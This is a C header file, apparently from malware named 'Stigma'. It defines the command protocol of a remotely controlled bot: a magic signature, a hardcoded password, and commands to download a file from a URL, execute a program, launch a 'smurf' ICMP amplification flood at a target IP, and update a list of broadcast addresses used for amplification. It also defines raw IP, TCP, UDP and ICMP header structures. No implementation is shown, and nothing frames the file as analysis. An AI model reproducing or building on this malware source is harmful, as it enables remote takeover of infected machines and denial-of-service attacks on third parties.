#define STIGMA_MAX_MSG_SIZE			512
#define STIGMA_SIGNATURE			0xCACABEBE
#define STIGMA_PASSWORD				"c4c4fut1"

#define COMMAND_ID_GETFILE			1
#define COMMAND_ID_EXECUTE			2
#define COMMAND_ID_SMURF			3
#define COMMAND_ID_UPDATEBCAST		4

#define SIZEOF_GETFILE_REMOTE		124
#define SIZEOF_GETFILE_LOCAL		128
#define SIZEOF_EXECUTE_APPNAME		128
#define SIZEOF_EXECUTE_PARAMS		128
#define SIZEOF_UPDATEBCAST_FILE		128
#define NUMBEROF_BROADCAST_ADDR		512

#define IP_HDRLEN_MASK				((BYTE) 0x0f)

#define TCP_FLAG_URGENT				0x20
#define TCP_FLAG_ACK				0x10
#define TCP_FLAG_PUSH				0x08
#define TCP_FLAG_RESET				0x04
#define TCP_FLAG_SYN				0x02
#define TCP_FLAG_FIN				0x01

#define ECHO_REPLY					0
#define DESTINATION_UNREACHABLE		3
#define SOURCE_QUENCH				4
#define REDIRECT					5
#define ECHO						8
#define ROUTER_ADVERTISEMENT		9
#define ROUTER_SOLICITATION			10
#define TIME_EXCEEDED				11
#define PARAMETER_PROBLEM			12
#define TIMESTAMP					13
#define TIMESTAMP_REPLY				14
#define INFORMATION_REQUEST			15
#define INFORMATION_REPLY			16
#define ADDRESS_MASK_REQUEST		17
#define ADDRESS_MASK_REPLY			18

typedef struct
{
	unsigned long	Signature ;
	unsigned long	Id ;
	unsigned char	RMD160[ 20] ;

} STIGMA_COMMAND ;

typedef struct
{
	unsigned long	Size ;
	char			Url[ SIZEOF_GETFILE_REMOTE] ;
	char			Local[ SIZEOF_GETFILE_LOCAL] ;

} STIGMA_COMMAND_GETFILE ;

typedef struct
{
	char			App[ SIZEOF_EXECUTE_APPNAME] ;
	char			Param[ SIZEOF_EXECUTE_PARAMS] ;

} STIGMA_COMMAND_EXECUTE ;

typedef struct
{
	unsigned long	Ip ;
	unsigned long	Count ;

} STIGMA_COMMAND_SMURF ;

typedef struct
{
	char			File[ SIZEOF_UPDATEBCAST_FILE] ;

} STIGMA_COMMAND_UPDATEBCAST ;

typedef struct
{
	unsigned long	NumberOfEntries ;
	unsigned char	RMD160[ 20] ;
	unsigned long	Broadcast[ NUMBEROF_BROADCAST_ADDR] ;

} STIGMA_BROADCAST_FILE ;

typedef struct
{
    unsigned char  ip_verlen ;
    unsigned char  ip_tos ;
    unsigned short ip_totallength ;
    unsigned short ip_id ;
    unsigned short ip_offset ;
    unsigned char  ip_ttl ;
    unsigned char  ip_protocol ;
    unsigned short ip_checksum ;
    unsigned int   ip_srcaddr ;
    unsigned int   ip_destaddr ;

} IP ;

typedef struct 
{
   BYTE			Type ;
   BYTE			Code ;
   WORD			Checksum ;
   DWORD		Misc ;

} ICMP ;

typedef struct 
{
    WORD		SrcPort ;
    WORD		DstPort ;
    DWORD		SeqNum ;
    DWORD		AckNum ;
    BYTE		DataOff ;
    BYTE		Flags ;
    WORD		Window ;
    WORD		Chksum ;
    WORD		UrgPtr ;

} TCP ;

typedef struct
{
	WORD		SrcPort ;
	WORD		DstPort ;
	WORD		DataOff ;
	WORD		Checksum ;

} UDP ;
